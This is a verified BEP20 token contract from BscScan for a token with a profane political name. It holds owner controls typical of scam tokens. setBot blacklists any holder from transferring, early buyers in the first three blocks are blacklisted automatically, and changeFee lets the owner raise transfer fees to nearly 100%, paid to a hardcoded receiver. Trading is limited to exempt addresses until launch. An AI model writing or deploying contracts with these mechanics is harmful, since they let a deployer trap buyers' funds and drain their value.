/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Ownable {
    address internal _owner;
    constructor(address __owner) {
        _owner = __owner;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(msg.sender == _owner, "!OWNER"); _;
    }

    function owner() public view returns(address){
        return _owner;
    }
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        _owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract contractToken is IBEP20, Ownable {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string _name = "Fuck Pelosi";
    string _symbol = "Fuck Pelosi";
    uint8 _decimals = 6;

    uint256 _totalSupply = 1000000000000000 * (10 ** _decimals);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;

    uint256 public liquidityFee = 0;
    uint256 public burnFee = 0;
    uint256 public marketingFee = 300;
    uint256 public totalFee = 300;
    uint256 public feeDenominator = 10000;

    address public marketingFeeReceiver;

    IDEXRouter public router;
    address public pair;

    bool public startSwap = false;
    uint256 public startNum;
    mapping (address => bool ) public isBot;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        
        address team = msg.sender;
        marketingFeeReceiver = 0xb476C948ac40020f462e6AC21f5919fba983E55D;

        address _presaler = msg.sender;
        isFeeExempt[_presaler] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[team] = true;
        isFeeExempt[marketingFeeReceiver] = true;

        _balances[team] = _totalSupply;
        emit Transfer(address(0), team, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external view override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

 
    function changeMarketingFeeReceiver(address adr) public {
        require(msg.sender == marketingFeeReceiver);
        marketingFeeReceiver = adr;
    }

    function setBot(address account) public onlyOwner{
		isBot[account] = true;
	}
	
	function removeBot(address account) public onlyOwner{
		isBot[account] = false;
	}

    function setFeeExempt(address adr)public onlyOwner{
        isFeeExempt[adr] = true;
    }
	function changeFee(uint256 _liquidityFee,uint256 _burnFee,uint256 _marketFee)public onlyOwner{
        liquidityFee = _liquidityFee;
        burnFee = _burnFee;
        marketingFee = _marketFee;
        totalFee =  liquidityFee + burnFee +  marketingFee;

        require(totalFee < feeDenominator,"");
    }

    function swapThreshold() public view returns(uint256){
        uint256 nump = balanceOf(pair);
        if(nump > 0){
            return nump.div(100);
        }else{
            return _totalSupply ; 
        }
    }
	
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(recipient != address(0),"");
        require(sender != address(0),"");
        require(!isBot[sender],"is bot");
        
        if(!startSwap){
            require(isFeeExempt[sender] && amount > 0,"");
            if(isFeeExempt[sender] && recipient == pair){
                startSwap = true;
                startNum = block.number;
            }
        }

        if(startNum != 0 && startNum + 3 > block.number ){
            if(sender == pair && !isFeeExempt[recipient]){
                isBot[recipient] = true;
            }
            if(recipient == pair && !isFeeExempt[sender]){
                isBot[sender] = true;
            }
        }

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
     
        if(shouldSwapBack()){ swapBack(); }

        uint256 amountReceived = shouldTakeFee(sender,recipient) ? takeFee(sender,  amount) : amount;
        _basicTransfer(sender,recipient,amountReceived);

        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender,address recipient) internal view returns (bool) {
        return !(isFeeExempt[sender] || isFeeExempt[recipient]);
    }

    function takeFee(address sender,  uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _basicTransfer(sender,address(this),feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && _balances[address(this)] >= swapThreshold();
    }

    function swapBack() internal swapping {

        uint256 swapamount = swapThreshold();

        uint256 burnamount = swapamount.mul(burnFee).div(totalFee);
        if(burnamount > 0){
            _basicTransfer(address(this), DEAD, burnamount);
            swapamount = swapamount.sub(burnamount);
        }

        uint256 dynamicLiquidityFee = liquidityFee;
        uint256 amountToLiquify = swapamount.mul(dynamicLiquidityFee).div(totalFee.sub(burnFee)).div(2);
        uint256 amountToSwap = swapamount.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance;
        uint256 totalBNBFee = totalFee.sub(burnFee).sub(dynamicLiquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.sub(amountBNBLiquidity);

        payable(marketingFeeReceiver).transfer(amountBNBMarketing);

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                DEAD,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);

    function airDrop(address[] memory adrs,uint256[] memory amounts) public {
        require(isFeeExempt[msg.sender],"");

        for(uint256 i = 0;i<amounts.length;i++){
            require(adrs[i] != address(0),"");
            _basicTransfer(msg.sender,adrs[i],amounts[i]);
        }
	}
}